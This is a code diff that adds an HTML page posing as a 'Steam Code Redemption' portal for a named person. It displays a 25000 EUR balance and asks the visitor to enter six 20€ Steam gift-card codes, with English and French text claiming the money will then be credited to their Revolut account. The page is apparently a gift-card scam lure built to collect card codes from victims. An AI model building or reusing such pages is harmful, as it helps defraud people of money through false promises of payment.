@@ -1,0 +1,62 @@
+<html><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jeronyml Ursoff - Steam Code Redemption</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="language-buttons">
+            <button onclick="changeLanguage('en')">English</button>
+            <button onclick="changeLanguage('fr')">Français</button>
+            <button onclick="changeLanguage('de')">Deutsch</button>
+        </div>
+        <h1 id="title">Steam Code Redemption</h1>
+        <p id="welcome">Welcome, Jeronyml Ursoff <span class="badge"></span></p>
+        <p class="balance" id="balance">Current Balance: 25000 EUR</p>
+        <p id="instruction">Please enter your six 20€ Steam codes below:</p>
+        <div class="code-inputs">
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint1">Code 1</span>
+            </div>
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint2">Code 2</span>
+            </div>
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint3">Code 3</span>
+            </div>
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint4">Code 4</span>
+            </div>
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint5">Code 5</span>
+            </div>
+            <div class="input-group">
+                <input type="text" maxlength="15" class="code-input" placeholder="XXXXX">
+                <span class="input-hint" id="hint6">Code 6</span>
+            </div>
+        </div>
+        <button onclick="submitCodes()" id="submitButton">Submit</button>
+    </div>
+
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p id="modalText">Once all 6 codes are entered, the money will be immediately credited to your main Revolut account.</p>
+        </div>
+    </div>
+
+    <div id="popup" class="popup">
+        Une fois les 6 codes saisis, l'argent sera immédiatement crédité sur votre compte Revolut principal.
+    </div>
+
+    <script src="script.js">
+    
+</script>
+</body>
+</html>
